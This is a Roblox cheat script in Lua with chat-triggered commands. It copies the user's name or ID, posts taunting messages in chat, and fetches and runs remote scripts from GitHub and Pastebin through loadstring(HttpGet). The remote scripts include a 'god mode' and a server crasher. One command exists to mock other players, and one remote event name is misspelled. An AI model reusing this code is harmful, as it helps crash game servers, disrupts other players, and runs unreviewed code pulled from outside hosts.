repeat
	wait()
until game:IsLoaded()

if game.PlaceId == 2788229376 then
local cmd = game.Players.LocalPlayer.Chatted:Connect(function(msg)
	if msg == "!name" then
		wait(0.3)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReqeust:FireServer(game.Players.LocalPlayer.Name, "All")
		setclipboard(game.Players.LocalPlayer.Name)
		elseif msg == "!crash" then
		wait(0.3)
			loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
		elseif msg == "!tt" then
			wait(0.3)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("vhitttt", "All")
		elseif msg == "!id" then
			wait(0.3)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Copied your ID to clipboard!", "All")
			setclipboard(game.Players.LocalPlayer.UserId)
		elseif msg == "!vh" then
			wait(0.3)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("vhitttt", "All")
		elseif msg == "!cr" then
			wait(0.3)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("vhituals made this script", "All")
		elseif msg == "!b" then
			wait(0.3)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Imagine begging for this scriptðŸ¤“ ", "All")
		elseif msg == "!mario" then
			loadstring(game:HttpGet("https://pastebin.com/raw/mA6ZE4Th", true))()
		elseif msg == "!swag" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
		elseif msg == "!god" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/Godv3'))()
		elseif msg == "!binds" then
			print("| h to enable/disable | ")
			print("| u to play death sound |")
			print("| k to go super skinny |")
			print("| x to tp |")
		end	
end)

	game.StarterGui:SetCore("SendNotification", {
		Title = "Script made by VH.";
		Text = "F9 for commands";
		Duration = "3.5"
	})
	print("---------------Made by VH--------------------")
	print("| Say !name to copy your username to clipboard. |")
	print("| Say !tt to say out your TikTok username. |")
	print("| Say !id to print your profile ID. |")
	print("| Say !vh to say your discord user out. |")
	print("| Say !mario to execute mario script. |")
	print("| Say !swag to execute SwagMode script. |")
	print("| Say !binds to print mario script keybinds in console. |")
	print("| Say !crash to load server crasher options. |")
	print("| Say !cr to say who created this script. |")
	print("| Say !b to be toxic to the kids who want this script. |")
	print("--------------------------------------------")
else
	print("nil")
end
